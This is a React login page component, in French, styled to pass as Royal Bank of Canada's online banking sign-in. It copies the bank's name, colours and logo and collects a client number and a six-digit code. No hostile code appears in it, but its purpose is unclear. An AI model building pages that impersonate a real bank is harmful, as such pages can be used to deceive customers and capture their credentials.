import React, { useState } from 'react';
import { X, Delete, Lock } from 'lucide-react';
import { useAuth } from '../context/AuthContext';

const RBC_BLUE  = '#003168';
const RBC_GOLD  = '#FEDF00';

const LoginPage = ({ navigate }) => {
  const { login } = useAuth();
  const [clientNumber, setClientNumber] = useState('');
  const [code, setCode]                 = useState('');
  const [showError, setShowError]       = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [isLoading, setIsLoading]       = useState(false);
  const [showKeyboard, setShowKeyboard] = useState(false);

  const handleNumberClick = (num) => {
    if (code.length < 6) setCode(code + num);
  };
  const handleDelete = () => setCode(code.slice(0, -1));

  const handleLogin = async () => {
    if (!clientNumber || !code) {
      setErrorMessage('Veuillez remplir tous les champs'); setShowError(true); return;
    }
    if (clientNumber.length !== 11) {
      setErrorMessage('Le numéro client doit contenir exactement 11 chiffres'); setShowError(true); return;
    }
    if (code.length !== 6) {
      setErrorMessage('Le code doit contenir exactement 6 chiffres'); setShowError(true); return;
    }
    setIsLoading(true);
    try {
      await login(clientNumber, code);
      navigate('/dashboard');
    } catch (err) {
      setErrorMessage(err.message || 'Identifiant ou mot de passe incorrect');
      setShowError(true);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div style={{ minHeight: '100vh', background: '#f5f5f5', display: 'flex', flexDirection: 'column' }}>

      {/* Header RBC */}
      <header style={{ background: RBC_BLUE, display: 'flex', alignItems: 'stretch', justifyContent: 'space-between' }}>
        <div style={{ display: 'flex', alignItems: 'center', padding: '10px 16px', gap: 10 }}>
          <img
            src="/images/L1.jpeg"
            alt="RBC"
            style={{ height: 40, width: 'auto', objectFit: 'contain' }}
            onError={(e) => { e.target.style.display = 'none'; e.target.nextSibling.style.display = 'flex'; }}
          />
          <div style={{
            display: 'none', width: 40, height: 40, background: RBC_GOLD,
            borderRadius: '50%', alignItems: 'center', justifyContent: 'center',
            fontWeight: 900, fontSize: 13, color: RBC_BLUE,
          }}>RBC</div>
          <span style={{ color: '#fff', fontWeight: 700, fontSize: 16 }}>Banque Royale</span>
        </div>
        <div style={{ background: RBC_GOLD, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '0 18px', gap: 3 }}>
          <Lock size={20} color={RBC_BLUE} />
          <span style={{ fontSize: 11, fontWeight: 700, color: RBC_BLUE, letterSpacing: 0.5 }}>CONNEXION</span>
        </div>
      </header>

      {/* Formulaire */}
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '2rem 1.5rem' }}>

        {/* Logo centré */}
        <div style={{ marginBottom: '2rem', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8 }}>
          <img
            src="/images/L1.jpeg"
            alt="RBC"
            style={{ height: 64, width: 'auto', objectFit: 'contain' }}
            onError={(e) => { e.target.style.display = 'none'; e.target.nextSibling.style.display = 'flex'; }}
          />
          <div style={{
            display: 'none', width: 64, height: 64, background: RBC_BLUE,
            borderRadius: '50%', alignItems: 'center', justifyContent: 'center',
            fontWeight: 900, fontSize: 22, color: RBC_GOLD,
          }}>RBC</div>
          <p style={{ color: '#555', fontSize: 14 }}>Banque Royale du Canada</p>
        </div>

        <div style={{ width: '100%', maxWidth: 400, background: '#fff', borderRadius: 4, padding: '2rem', boxShadow: '0 2px 12px rgba(0,0,0,0.08)' }}>
          <h2 style={{ color: RBC_BLUE, fontSize: 20, fontWeight: 700, marginBottom: 6 }}>Ouvrir une session</h2>
          <p style={{ color: '#666', fontSize: 13, marginBottom: '1.5rem' }}>RBC Banque en direct</p>

          {showError && (
            <div style={{
              background: '#fff3f3', border: '1px solid #ffcdd2', borderRadius: 4,
              padding: '12px 14px', marginBottom: '1rem',
              display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            }}>
              <span style={{ color: '#c62828', fontSize: 13 }}>{errorMessage}</span>
              <button onClick={() => setShowError(false)} style={{ background: 'none', border: 'none', cursor: 'pointer' }}>
                <X size={16} color="#c62828" />
              </button>
            </div>
          )}

          {/* N° Client */}
          <div style={{ marginBottom: '1.2rem' }}>
            <label style={{ display: 'block', fontSize: 12, fontWeight: 700, color: '#444', marginBottom: 6, textTransform: 'uppercase', letterSpacing: 0.5 }}>
              N° Client (11 chiffres)
            </label>
            <input
              type="text"
              value={clientNumber}
              onChange={(e) => {
                const v = e.target.value.replace(/\D/g, '');
                if (v.length <= 11) setClientNumber(v);
              }}
              style={{
                width: '100%', padding: '12px 14px', border: `2px solid ${clientNumber ? RBC_BLUE : '#d1d5db'}`,
                borderRadius: 2, fontSize: 15, outline: 'none', boxSizing: 'border-box',
              }}
              placeholder="01234567890"
              autoComplete="off"
              maxLength={11}
              disabled={isLoading}
            />
            <p style={{ fontSize: 11, color: '#888', marginTop: 4 }}>{clientNumber.length}/11 chiffres</p>
          </div>

          {/* Code */}
          <div style={{ marginBottom: '1.5rem' }}>
            <label style={{ display: 'block', fontSize: 12, fontWeight: 700, color: '#444', marginBottom: 6, textTransform: 'uppercase', letterSpacing: 0.5 }}>
              Code (6 chiffres)
            </label>
            <input
              type="password"
              value={code}
              readOnly
              onFocus={() => setShowKeyboard(true)}
              style={{
                width: '100%', padding: '12px 14px', border: `2px solid ${code ? RBC_BLUE : '#d1d5db'}`,
                borderRadius: 2, fontSize: 15, outline: 'none', boxSizing: 'border-box', cursor: 'pointer',
              }}
              placeholder="••••••"
            />
            <p style={{ fontSize: 11, color: '#888', marginTop: 4 }}>{code.length}/6 chiffres</p>
          </div>

          {/* Clavier numérique */}
          {showKeyboard && (
            <div style={{ background: '#f9fafb', borderRadius: 4, padding: '16px', marginBottom: '1.2rem', display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 10 }}>
              {[1,2,3,4,5,6,7,8,9].map(num => (
                <button key={num} onClick={() => handleNumberClick(num.toString())} disabled={isLoading}
                  style={{
                    padding: '14px', background: '#fff', border: '1px solid #e5e7eb',
                    borderRadius: 2, fontSize: 20, fontWeight: 600, cursor: 'pointer',
                    color: RBC_BLUE, transition: 'background 0.15s',
                  }}
                >{num}</button>
              ))}
              <div />
              <button onClick={() => handleNumberClick('0')} disabled={isLoading}
                style={{
                  padding: '14px', background: '#fff', border: '1px solid #e5e7eb',
                  borderRadius: 2, fontSize: 20, fontWeight: 600, cursor: 'pointer', color: RBC_BLUE,
                }}
              >0</button>
              <button onClick={handleDelete} disabled={isLoading}
                style={{
                  padding: '14px', background: '#fff', border: '1px solid #e5e7eb',
                  borderRadius: 2, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
                }}
              >
                <Delete size={22} color={RBC_BLUE} />
              </button>
            </div>
          )}

          <button
            onClick={handleLogin}
            disabled={isLoading}
            style={{
              width: '100%', padding: '14px', background: isLoading ? '#90a4c8' : RBC_BLUE,
              color: '#fff', border: 'none', borderRadius: 2,
              fontSize: 16, fontWeight: 700, cursor: isLoading ? 'not-allowed' : 'pointer',
              transition: 'background 0.2s',
            }}
          >
            {isLoading ? 'Connexion en cours...' : 'Ouvrir une session'}
          </button>

          <div style={{ marginTop: '1.2rem', textAlign: 'center' }}>
            <p style={{ color: '#555', fontSize: 13 }}>
              Pas encore de compte ?{' '}
              <button onClick={() => navigate('/inscription')} style={{
                background: 'none', border: 'none', color: RBC_BLUE,
                fontWeight: 700, cursor: 'pointer', textDecoration: 'underline', fontSize: 13,
              }}>S'inscrire</button>
            </p>
          </div>

          <div style={{ marginTop: '1rem', textAlign: 'center' }}>
            <button onClick={() => navigate('/')} style={{
              background: 'none', border: 'none', color: '#666',
              fontSize: 13, cursor: 'pointer', textDecoration: 'underline',
            }}>← Retour à l'accueil</button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;